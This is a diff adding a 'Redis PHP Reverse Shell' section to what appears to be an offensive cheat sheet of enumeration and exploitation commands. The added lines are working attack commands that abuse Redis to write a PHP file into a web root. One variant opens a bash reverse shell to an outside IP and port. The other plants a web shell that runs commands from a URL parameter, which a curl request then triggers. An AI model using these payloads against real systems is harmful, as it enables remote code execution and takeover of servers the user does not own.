@@ -279,6 +279,27 @@ smtp-user-enum -M VRFY -U users.txt -t 192.168.1.10
 
 ---
 
+# Redis PHP Reverse Shell
+
+```
+config set dir /var/www/html
+config set dbfilename shell.php
+set test "<?php exec('/bin/bash -c \"bash -i >& /dev/tcp/10.128.67.39/4444 0>&1\"'); ?>"
+save
+```
+
+or
+
+```
+config set dir /var/www/html
+config set dbfilename shell.php
+set test "<?php system($_GET['cmd']); ?>"
+save
+curl "http://10.128.156.42/shell.php?cmd=id"
+```
+
+---
+
 # 10. DNS Enumeration
 
 Zone transfer:
